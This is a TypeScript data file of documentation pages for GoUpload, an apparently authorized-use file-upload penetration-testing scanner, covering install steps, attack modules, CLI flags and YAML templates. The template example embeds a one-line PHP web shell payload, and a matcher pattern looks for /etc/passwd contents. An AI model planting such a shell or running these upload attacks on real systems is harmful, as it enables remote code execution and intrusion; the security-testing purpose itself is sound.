import { DocPage } from './types';

export const pagesData: Record<string, DocPage> = {
  introduction: {
    title: 'Introduction',
    description:
      'GoUpload is a high-performance, concurrent web application file-upload security scanner written in Go.',
    badge: 'Overview',
    sections: [
      {
        heading: 'What is GoUpload?',
        body: 'GoUpload is purpose-built to automate the testing of file upload endpoints for dangerous security weaknesses. In modern web applications, file uploads are among the highest-risk attack surfaces — improper handling can lead to Remote Code Execution (RCE), Server-Side Request Forgery (SSRF), Local File Inclusion (LFI), Path Traversal, and Denial of Service (DoS). GoUpload systematically stress-tests upload forms and APIs with 344+ curated payloads across 13 modular attack vectors.',
      },
      {
        heading: 'Key Capabilities',
        bullets: [
          '344+ Security Payloads across 13 attack modules (Extension evasion, Content-Type spoofing, Magic bytes, Path traversal, GraphQL, Race conditions, XXE, Polyglots, Server configs, etc.).',
          'Intelligent Oracle Engine: Compares suspicious file uploads against a benign upload baseline (scientific control group) to eliminate false positives.',
          'RCE Auto-Verification (--verify-rce): Actively attempts to confirm code execution on uploaded shells, providing indisputable proof (e.g. uid= output).',
          'GraphQL File Upload Testing: First-class support for GraphQL multipart request specs and custom upload mutations.',
          'Smart Tech Fingerprinting (--auto-detect): Automatically fingerprints the target stack (PHP, ASP.NET, Java, Node.js, Python) to focus testing.',
          'Upload Form Auto-Discovery (--discover): Crawls target web pages to automatically locate upload forms and multipart input parameters.',
          'Nuclei-Style YAML Templates: Extendable with custom attack profiles, regex matchers, and response extractors.',
          'High Concurrency: Goroutine-based worker pool delivering lightning-fast scans (344+ tests executed in under 1 second).',
          'Structured Output: Human-friendly terminal reports with color-coded confidence levels, plus machine-readable JSON output for CI/CD integration.',
        ],
      },
      {
        heading: 'Authorization & Ethical Use Notice',
        callout: {
          type: 'important',
          text: 'GoUpload is designed exclusively for authorized penetration testing, security auditing, and educational research. You must obtain explicit, written permission from the system owner before scanning any target. Unauthorized scanning or exploitation of systems is strictly illegal and unethical. The authors assume no liability for misuse of this tool.',
        },
        body: 'Always verify findings manually in accordance with your rules of engagement. A flagged finding indicates evidence of a potential flaw, which must be responsibly validated and remediated.',
      },
      {
        heading: 'Quick Verification',
        body: 'Once installed, verify that GoUpload is operational and inspect the loaded modules:',
        code: 'go install -v github.com/HaakimSec/GoUpload@latest\nGoUpload -v\nGoUpload --list-modules',
        codeTitle: 'terminal',
      },
    ],
  },

  installation: {
    title: 'Installation',
    description:
      'Install GoUpload via the Go toolchain, compile from source, or run in isolated Docker containers.',
    badge: 'Setup',
    sections: [
      {
        heading: 'Method 1: Go Install (Recommended)',
        body: 'The fastest way to install GoUpload on any system with Go 1.25+ installed is via go install:',
        code: 'go install -v github.com/HaakimSec/GoUpload@latest',
        codeTitle: 'bash',
      },
      {
        heading: 'Configuring Your PATH',
        body: 'If your terminal reports "GoUpload: command not found", ensure that your Go binary directory ($HOME/go/bin) is included in your system PATH environment variable.',
        bullets: [
          'For Bash: echo \'export PATH=$PATH:$HOME/go/bin\' >> ~/.bashrc && source ~/.bashrc',
          'For Zsh: echo \'export PATH=$PATH:$HOME/go/bin\' >> ~/.zshrc && source ~/.zshrc',
          'For Fish: fish_add_path (go env GOPATH)/bin',
        ],
      },
      {
        heading: 'Method 2: Build from Source',
        body: 'To build the latest development branch from the GitHub repository:',
        code: `# Clone repository\ngit clone https://github.com/HaakimSec/GoUpload.git\ncd GoUpload\n\n# Build GoUpload binary\ngo build -o GoUpload main.go\n\n# (Optional) Move to system path\nsudo mv GoUpload /usr/local/bin/`,
        codeTitle: 'bash (Linux / macOS)',
      },
      {
        heading: 'Windows Build & Setup',
        body: 'On Windows, compile with go build -o GoUpload.exe main.go and add it to your user PATH using PowerShell:',
        code: `# In PowerShell:\ngit clone https://github.com/HaakimSec/GoUpload.git\ncd GoUpload\ngo build -o GoUpload.exe main.go\n\n# Move to user bin directory and update PATH\nNew-Item -ItemType Directory -Path "$env:USERPROFILE\\bin" -Force\nMove-Item GoUpload.exe "$env:USERPROFILE\\bin\\"\n[Environment]::SetEnvironmentVariable("Path", $env:Path + ";$env:USERPROFILE\\bin", "User")`,
        codeTitle: 'powershell',
      },
      {
        heading: 'Method 3: Docker Container',
        body: 'GoUpload includes a multi-stage Dockerfile for lightweight, dependency-free execution:',
        code: `# Build Docker image\ndocker build -t goupload:latest .\n\n# Check version\ndocker run --rm goupload:latest -v\n\n# Run a scan inside Docker\ndocker run --rm goupload:latest -u http://target.example/upload -p file --check`,
        codeTitle: 'docker',
      },
      {
        heading: 'Self-Updating',
        body: 'You can update your GoUpload installation directly using the built-in update flag:',
        code: 'GoUpload --update',
        codeTitle: 'terminal',
      },
    ],
  },

  'quick-start': {
    title: 'Quick Start',
    description:
      'A step-by-step practical guide to scanning upload endpoints safely and effectively.',
    badge: 'Tutorial',
    sections: [
      {
        heading: 'Step 1: Check Target Connectivity',
        body: 'Before dispatching any security payloads, verify that the target endpoint is reachable and responsive using check mode (-C / --check). This sends no offensive payloads.',
        code: 'GoUpload --check -u http://target.example/upload',
        codeTitle: 'terminal',
      },
      {
        heading: 'Step 2: Auto-Detect Tech Stack',
        body: 'Enable fingerprinting with --auto-detect. GoUpload probes HTTP response headers, cookies, and server banners to identify PHP, ASP.NET, Java, Node.js, or Python backends.',
        code: 'GoUpload -u http://target.example/upload --auto-detect',
        codeTitle: 'terminal',
      },
      {
        heading: 'Step 3: Baseline-Assisted Scan (Best Accuracy)',
        body: 'Provide an --allow-list of known benign extensions (e.g. .jpg,.png,.txt). GoUpload uploads a safe control file first, records the baseline response length and status, and uses scientific delta comparison to evaluate all subsequent payloads.',
        code: 'GoUpload -u http://target.example/upload -p file \\\n  --allow-list .jpg,.png \\\n  -c 20',
        codeTitle: 'terminal',
      },
      {
        heading: 'Step 4: Target Specific Attack Modules',
        body: 'Select individual or comma-separated attack modules with --module to focus your test scope:',
        code: 'GoUpload -u http://target.example/upload -p file \\\n  --module extension,path-traversal,magic-byte',
        codeTitle: 'terminal',
      },
      {
        heading: 'Step 5: Discover Upload Forms Automatically',
        body: 'If you only know the web application URL but not the exact upload endpoint or file parameter name, use --discover mode to crawl the HTML form elements:',
        code: 'GoUpload -u http://target.example/profile/edit --discover',
        codeTitle: 'terminal',
      },
      {
        heading: 'Step 6: RCE Auto-Verification',
        body: 'When you want indisputable confirmation of Remote Code Execution on flagged findings, add --verify-rce (or -rce). GoUpload attempts to access the uploaded shell and execute a benign command (such as id or whoami):',
        code: 'GoUpload -u http://target.example/upload -p file \\\n  --allow-list .jpg \\\n  --verify-rce',
        codeTitle: 'terminal',
      },
    ],
  },

  workflow: {
    title: 'Scan Workflow & Lifecycle',
    description:
      'Detailed architecture of how GoUpload orchestrates validation, payload selection, concurrency, and analysis.',
    badge: 'Workflow',
    sections: [
      {
        heading: 'The Scan Lifecycle',
        body: 'When GoUpload runs, it follows a deterministic multi-stage pipeline designed for safety, performance, and accuracy:',
        bullets: [
          '1. CLI Parsing & Validation: Parses arguments, headers, data fields, and concurrency limits.',
          '2. Target Validation: Verifies endpoint reachability unless --no-validate is passed.',
          '3. Tech Fingerprinting: Probes server headers and response signatures if --auto-detect is active.',
          '4. Form Discovery (Optional): If --discover is supplied, extracts input fields from HTML forms.',
          '5. Template & Module Selection: Loads YAML templates and registers the selected attack modules.',
          '6. Payload Matrix Generation: Expands payloads for the target tech stack (PHP, ASP.NET, Java, etc.).',
          '7. Baseline Upload: If --allow-list is set, uploads a benign control file and captures baseline metrics.',
          '8. Concurrent Worker Pool: Dispatches HTTP multipart requests across N concurrent worker goroutines.',
          '9. Oracle Analysis: Analyzes each response in real time against the baseline metrics and flag rules.',
          '10. Result Reporting: Renders color-coded terminal progress and outputs JSON if configured.',
          '11. RCE Verification (Optional): If --verify-rce is enabled, verifies execution on vulnerable uploads.',
        ],
      },
      {
        heading: 'Baseline vs. Heuristic Mode',
        body: 'GoUpload operates in two primary analysis modes depending on whether an allow list is provided:',
        table: {
          headers: ['Feature', 'Baseline Mode (--allow-list)', 'Heuristic Mode (Default)'],
          rows: [
            ['Control Group', 'Uploads safe benign file first', 'No control file uploaded'],
            ['Metrics Checked', 'Status code, body length ratio, content-type, snippets', 'Regex pattern matching on responses'],
            ['False Positive Rate', 'Extremely low (scientific comparison)', 'Moderate (depends on server error format)'],
            ['Recommended Use', 'Authorized pentests, CI/CD pipelines', 'Quick initial triage, blind reconnaissance'],
          ],
        },
      },
      {
        heading: 'Worker Pool & Concurrency',
        body: 'GoUpload uses a buffered-channel worker pool architecture. The worker pool manages HTTP client connections, enforces timeouts, supports HTTP proxy routing, and synchronizes race condition payloads with millisecond precision.',
      },
    ],
  },

  modules: {
    title: 'Scanner Modules Overview',
    description:
      'GoUpload organizes all 344+ security tests across 13 dedicated attack modules. Run them all or select specific modules with --module.',
    badge: 'Modules',
    sections: [
      {
        heading: 'All 13 Attack Modules',
        body: 'By default, GoUpload runs all enabled modules. You can select specific modules with --module or -m, or list all available modules with --list-modules.',
        table: {
          headers: ['Module Identifier', 'Category', 'Test Focus', 'Payload Count'],
          rows: [
            ['extension', 'Extension Evasion', 'Alternative extensions, case variations, double extensions', '20+'],
            ['content-type', 'MIME Manipulation', 'Content-Type header spoofing (JPEG, PNG, PDF)', '30+'],
            ['magic-byte', 'Content Inspection', 'File signature spoofing (GIF89a, PNG, JPEG, PDF)', '15+'],
            ['filename', 'Sanitization Faults', 'Trailing spaces/dots, NTFS ::$DATA, null-bytes', '25+'],
            ['path-traversal', 'Directory Traversal', 'Traversal sequences, encoded variants, absolute paths', '20+'],
            ['graphql', 'API Uploads', 'GraphQL multipart requests, custom mutations, batches', '138+'],
            ['unicode', 'Encoding Attacks', 'RTLO (\\u202E), zero-width characters, homoglyphs', '40+'],
            ['size-boundary', 'Boundary Checks', '0-byte files, exact 1KB/1MB/10MB limits, chunking', '15+'],
            ['race-condition', 'TOCTOU Concurrency', 'Synchronized bursts, extension check vs save races', '30+'],
            ['polyglot', 'Multi-format Files', 'GIF/PNG+PHP, SVG XSS/XXE, ZIP Slip, ZIP bombs', '11+'],
            ['xxe', 'XML Entities', 'SVG XXE, DOCX/XLSX, JPEG metadata, SSRF to cloud metadata', '15+'],
            ['server-config', 'Server Overrides', 'Apache .htaccess, IIS web.config, PHP .user.ini, Nginx', '42'],
            ['template', 'Custom Templates', 'YAML attack profiles with regex matchers and extractors', 'Custom'],
          ],
        },
      },
      {
        heading: 'Common Scanning Recipes',
        bullets: [
          'Standard Web App Audit: GoUpload -u http://target.example/upload -p file --module extension,content-type,magic-byte,filename,path-traversal --allow-list .jpg,.png',
          'API Security Test: GoUpload -u http://target.example/graphql -p file --module graphql,xxe,server-config',
          'Race Condition Stress Test: GoUpload -u http://target.example/upload -p file --module race-condition -c 25',
          'Server Configuration & Polyglot Test: GoUpload -u http://target.example/upload -p file --module server-config,polyglot',
        ],
      },
    ],
  },

  results: {
    title: 'Results & Oracle System',
    description:
      'GoUpload’s decision engine combines baseline delta analysis, multi-flag scoring, and confidence heuristics to classify findings.',
    badge: 'Analysis',
    sections: [
      {
        heading: 'The Oracle Decision Engine',
        body: 'Unlike simplistic upload scanners that merely inspect whether the server returned HTTP 200 OK, GoUpload implements a scientific Oracle comparison engine. By analyzing the delta between benign baseline uploads and suspicious attack payloads, the Oracle accurately distinguishes accepted uploads from soft-error pages.',
      },
      {
        heading: 'The 9 Oracle Detection Flags',
        table: {
          headers: ['Detection Flag', 'Severity', 'Trigger Condition'],
          rows: [
            ['suspicious-ext-accepted', 'CRITICAL / HIGH', 'File with executable extension (.php, .asp, .jsp) returned HTTP 200/201'],
            ['response-length-matches-baseline', 'HIGH', 'Payload response body length is within 90%-110% of safe control baseline'],
            ['status-matches-baseline', 'MEDIUM', 'Payload returned exact same HTTP status code as the safe control file'],
            ['json-indicates-success', 'HIGH', 'JSON response contains success indicators (e.g. "success":true, "status":"ok")'],
            ['filename-reflected-in-response', 'HIGH', 'The uploaded filename or payload identifier is echoed back in the response'],
            ['html-indicates-success', 'MEDIUM', 'HTML body contains success phrases such as "file uploaded successfully"'],
            ['filepath-disclosed', 'CRITICAL', 'Response discloses the absolute or relative server storage path (e.g. /uploads/...)'],
            ['spoofed-content-accepted', 'HIGH', 'Executable file body with spoofed Content-Type was accepted without rejection'],
            ['traversal-filename-accepted', 'CRITICAL', 'Filename containing directory traversal sequences (../) was saved or confirmed'],
          ],
        },
      },
      {
        heading: 'Verdict Classifications',
        table: {
          headers: ['Verdict', 'Confidence', 'Meaning & Action Required'],
          rows: [
            ['VULNERABLE', '85% - 100%', 'Multiple high-confidence flags matched. Finding has strong evidence of exploitability. Manual verification and remediation required.'],
            ['SUSPECT', '50% - 84%', 'Some indicators triggered (e.g. ambiguous status code or partial reflection). Requires manual investigation.'],
            ['SAFE', '0% - 49%', 'Target properly rejected payload (400, 403, 415, 422) or response diverged completely from baseline.'],
            ['ERROR', 'N/A', 'Request failed due to network timeout, socket reset, or DNS failure.'],
          ],
        },
      },
      {
        heading: 'Machine-Readable Output',
        body: 'Export results to JSON for automated CI/CD security quality gates or custom reporting:',
        code: 'GoUpload -u http://target.example/upload -p file \\\n  --output json \\\n  --output-file results.json\n\n# Filter with jq for vulnerable findings\ncat results.json | jq \'.findings[] | select(.verdict=="VULNERABLE")\'',
        codeTitle: 'bash',
      },
    ],
  },

  cli: {
    title: 'CLI Reference & Commands',
    description:
      'Complete reference of all command-line flags, options, and environment configurations supported by GoUpload.',
    badge: 'CLI',
    sections: [
      {
        heading: 'Target & HTTP Flags',
        table: {
          headers: ['Flag', 'Shorthand', 'Type', 'Description'],
          rows: [
            ['--url', '-u', 'string', 'Target upload endpoint URL (Required for scanning)'],
            ['--param', '-p', 'string', 'Name of the multipart file parameter (Default: "file")'],
            ['--headers', '-H', 'string', 'Custom headers as key:value or path to JSON header file'],
            ['--data', '-d', 'string', 'Additional form fields formatted as key:value pairs'],
            ['--concurrency', '-c', 'int', 'Number of concurrent worker goroutines (Default: 10)'],
            ['--allow-list', '', 'string', 'Comma-separated allowed extensions for baseline testing (.jpg,.png)'],
          ],
        },
      },
      {
        heading: 'Scan & Module Control',
        table: {
          headers: ['Flag', 'Shorthand', 'Type', 'Description'],
          rows: [
            ['--module', '-m', 'string', 'Comma-separated modules to execute (e.g. extension,xxe)'],
            ['--list-modules', '', 'bool', 'List all available modules with status and exit'],
            ['--tech', '-t', 'string', 'Target tech stack: php, asp.net, java, nodejs, python, all (Default: all)'],
            ['--auto-detect', '', 'bool', 'Automatically fingerprint target tech stack before testing'],
            ['--check', '-C', 'bool', 'Check target reachability only; do not send payloads'],
            ['--no-validate', '', 'bool', 'Skip target reachability pre-validation check'],
            ['--discover', '', 'bool', 'Crawl target page and auto-discover upload HTML forms'],
          ],
        },
      },
      {
        heading: 'Advanced & Specialized Flags',
        table: {
          headers: ['Flag', 'Shorthand', 'Type', 'Description'],
          rows: [
            ['--verify-rce', '-rce', 'bool', 'Automatically confirm RCE on flagged uploads with command proof'],
            ['--template', '', 'string', 'Path to custom YAML attack template'],
            ['--templates-dir', '', 'string', 'Directory containing YAML attack templates'],
            ['--list-templates', '', 'bool', 'List all discovered YAML templates and exit'],
            ['--graphql-mutation', '', 'string', 'Custom GraphQL mutation string for file uploads'],
            ['--graphql-variable', '', 'string', 'GraphQL variable name for file upload (Default: "file")'],
            ['--output', '', 'string', 'Output format: table, json (Default: "table")'],
            ['--output-file', '', 'string', 'Save scan results to specified file path'],
            ['--debug', '', 'bool', 'Show detailed error info and full response bodies'],
            ['--version', '-v', 'bool', 'Print GoUpload version and exit'],
            ['--update', '', 'bool', 'Update GoUpload to latest version via go install'],
          ],
        },
      },
      {
        heading: 'Experimental ML Integration Flags',
        table: {
          headers: ['Flag', 'Default', 'Description'],
          rows: [
            ['--ml', 'false', 'Enable machine learning confidence scoring (requires ML server)'],
            ['--ml-server', 'http://localhost:5000', 'URL of the FastAPI ML inference server'],
            ['--ml-confidence', '0.65', 'Minimum confidence threshold for ML-assisted findings'],
          ],
        },
      },
    ],
  },

  templates: {
    title: 'YAML Attack Templates',
    description:
      'Extend GoUpload with custom CVE exploits, framework attack profiles, and Nuclei-style regex matchers without recompiling Go code.',
    badge: 'Templates',
    sections: [
      {
        heading: 'Template Anatomy',
        body: 'GoUpload templates are YAML documents defining target metadata, attack payloads, and response matchers:',
        code: `name: "Drupal File Upload Bypass"
description: "Tests CVE-2020-13671 double extension vulnerability"
author: "@security_team"
version: "1.0"
tech_stack: "php"

target:
  endpoint: "/file/upload"
  method: "POST"
  param: "files[upload]"

headers:
  Authorization: "Bearer TOKEN"
  X-Custom-Header: "audit-scan"

form_data:
  form_build_id: "form-xyz"
  form_id: "user_profile_form"

payloads:
  - name: "Double extension .php.txt"
    filename: "shell.php.txt"
    extension: ".txt"
    content_type: "text/plain"
    body: "<?php system($_GET['cmd']); ?>"
    tags: ["cve-2020-13671", "drupal"]

matchers-condition: and
matchers:
  - type: status
    status: [200, 201]

  - type: word
    words:
      - "File uploaded"
      - "success"
    condition: or

  - type: word
    words:
      - "access denied"
      - "forbidden"
    negative: true

extractors:
  - type: regex
    regex: 'uploads/([a-zA-Z0-9/_.-]+)'
    name: file_path
    group: 1`,
        codeTitle: 'template.yaml',
      },
      {
        heading: 'Supported Matcher Types',
        table: {
          headers: ['Matcher Type', 'Description', 'Example'],
          rows: [
            ['word', 'Case-insensitive substring search in response body', 'words: ["success", "file uploaded"]'],
            ['regex', 'Regular expression pattern evaluation', 'regex: ["root:.*?:[0-9]*:[0-9]*:"]'],
            ['status', 'HTTP status code matching', 'status: [200, 201]'],
            ['size', 'Response body byte size comparison', 'size: [">1000", "<5000"]'],
          ],
        },
      },
      {
        heading: 'Repository Template Structure',
        body: 'Templates in the GoUpload repository are organized into categorized directories:',
        bullets: [
          'templates/cms/ — CMS platforms (WordPress, Drupal, Joomla, Ghost)',
          'templates/cves/ — Documented CVE exploits (CVE-2020-13671, etc.)',
          'templates/exploits/ — Server-specific tricks (Apache, Nginx, IIS)',
          'templates/frameworks/ — Application frameworks (Laravel, Django, Express)',
          'templates/graphql/ — Apollo Server, Yoga, and GraphQL upload mutations',
          'templates/labs/ — Security practice labs (DVWA, Juice Shop, Battle Lab)',
          'templates/enhanced/ — Advanced multi-condition templates with extractors',
          'templates/custom/ — User-created attack profiles',
        ],
      },
      {
        heading: 'Running & Validating Templates',
        code: `# Run against a target endpoint\nGoUpload --template templates/labs/battle-lab.yaml -u http://target.example/upload -p file\n\n# List all templates available in repository\nGoUpload --list-templates`,
        codeTitle: 'terminal',
      },
    ],
  },

  architecture: {
    title: 'Architecture & Internals',
    description:
      'High-level architectural overview of GoUpload’s modular design, concurrency model, and data pipeline.',
    badge: 'Internals',
    sections: [
      {
        heading: 'High-Level Data Flow',
        code: `CLI / Flags
     │
     ▼
Config Parsing & Validation (internal/config)
     │
     ▼
Target Reachability Validation (internal/validator)
     │
     ▼
Technology Fingerprinting (internal/fingerprint)
     │
     ▼
Module Registry & Payload Generation (internal/payload)
     │
     ▼
Baseline Upload Execution (internal/oracle)
     │
     ▼
Concurrent Worker Pool Execution (internal/worker)
     │
     ▼
Real-Time Oracle Response Analysis (internal/oracle)
     │
     ▼
Terminal Table & JSON Reporting (internal/output)
     │
     ▼
RCE Auto-Verification (internal/verifier)`,
        codeTitle: 'architecture-flow',
      },
      {
        heading: 'Internal Package Responsibilities',
        table: {
          headers: ['Package Path', 'Primary Responsibility'],
          rows: [
            ['main.go', 'Application entrypoint, flag triggering, exit code handling'],
            ['internal/app', 'Orchestrates the end-to-end scan lifecycle and coordinates subsystems'],
            ['internal/config', 'CLI parsing, flag validation, header file loading, version tracking'],
            ['internal/payload', '13 modular payload generators, test types, and payload struct definitions'],
            ['internal/worker', 'High-speed concurrent HTTP worker pool with channel multiplexing'],
            ['internal/oracle', 'Baseline comparison, flag scoring, heuristic classification, and verdicts'],
            ['internal/output', 'Rainbow ASCII banners, live progress bars, tables, and JSON export'],
            ['internal/template', 'YAML parser, Nuclei-style regex/word matcher engine, and extractors'],
            ['internal/fingerprint', 'Server header and signature analysis for tech stack detection'],
            ['internal/validator', 'URL format and target connectivity pre-flight checks'],
            ['internal/verifier', 'RCE verification engine that probes uploaded shells with command execution'],
            ['internal/ml', 'FastAPI machine learning client for hybrid confidence prediction'],
          ],
        },
      },
      {
        heading: 'Concurrency & Thread Safety',
        body: 'GoUpload achieves sub-second execution across hundreds of tests by leveraging Go’s native goroutines and channels. The worker pool spawns a configurable number of worker goroutines (default 10) fed by a job channel. Terminal output and aggregate statistics are protected by mutex locks to ensure deterministic reporting without race conditions.',
      },
    ],
  },

  contributing: {
    title: 'Contributing to GoUpload',
    description:
      'How to set up your local development environment, run tests, adhere to conventions, and contribute new scanner modules or templates.',
    badge: 'Community',
    sections: [
      {
        heading: 'Development Setup',
        body: 'GoUpload requires Go version 1.25 or newer. Clone the repository and verify your build:',
        code: `# Clone repository\ngit clone https://github.com/HaakimSec/GoUpload.git\ncd GoUpload\n\n# Run tests\ngo test -v ./...\n\n# Check for lint issues\ngo vet ./...\n\n# Build locally\ngo build -o GoUpload main.go`,
        codeTitle: 'bash',
      },
      {
        heading: 'Step-by-Step: Adding a New Attack Module',
        body: 'Adding a new attack technique to GoUpload follows a standardized 5-step process:',
        bullets: [
          '1. Create the Module File: Create internal/payload/module.your_module.go and implement moduleYourModule() []*Payload returning your crafted payloads.',
          '2. Register TestType: In internal/payload/generator.go, add a unique TestType constant (e.g. TestTypeYourModule TestType = "Your Module").',
          '3. Register in ModuleRegistry: In internal/payload/modules.go, add an entry to ModuleRegistry with name, description, and default enabled state.',
          '4. Wire into AllPayloads: In internal/payload/generator.go, add a conditional check IsModuleEnabled(TestTypeYourModule) to append your payloads.',
          '5. Wire in Orchestrator: In internal/app/app.go, register your module in moduleOrder and moduleNames for progress bar tracking.',
          '6. Write Unit Tests: Add tests to internal/payload/payload_test.go verifying that your module outputs the expected payload count.',
        ],
      },
      {
        heading: 'Contributing YAML Templates',
        body: 'If you want to contribute CVE exploits or specialized attack patterns without touching Go code, create a YAML template in templates/[category]/ and submit a Pull Request. Test your template against local labs (such as DVWA or Battle Lab) before submitting.',
      },
      {
        heading: 'Code Style & PR Guidelines',
        bullets: [
          'Run gofmt -w . on all modified Go files before committing.',
          'Wrap errors using fmt.Errorf("...: %w", err) to preserve the error chain.',
          'Keep comments concise and focused on rationale rather than repeating code statements.',
          'Document new CLI flags in both internal/config/config.go and the root README.md.',
          'Ensure all existing unit tests pass before opening a Pull Request.',
        ],
      },
    ],
  },

  'known-issues': {
    title: 'Known Issues & Release History',
    description:
      'Tracking resolved issues, changelog notes, and known caveats across GoUpload versions.',
    badge: 'Changelog',
    sections: [
      {
        heading: 'Version 1.8.3 — Current Release',
        bullets: [
          'Current stable version across package managers.',
          'Full support for all 13 attack modules with automated RCE verification.',
          'No known critical defects or blocking bugs.',
        ],
      },
      {
        heading: 'Version 1.8.2 — Resolved Issues',
        bullets: [
          'Server-Config Module Fix: moduleServerConfig() was previously unwired in generator.go. Added module.server_config.go with 42 tech-agnostic configuration payloads (.htaccess, web.config, .user.ini, nginx, lighttpd, tomcat, nodejs).',
          'Polyglot Module Fix: moduleF() was previously restricted to PHP and default tech stacks. Moved polyglot testing outside tech switch so it runs for all targets.',
          'GraphQL Module Registry Fix: Corrected registry entry from TestTypeExtensionEvasion to TestTypeGraphQL, ensuring --module graphql correctly filters GraphQL payloads.',
        ],
      },
    ],
  },
};
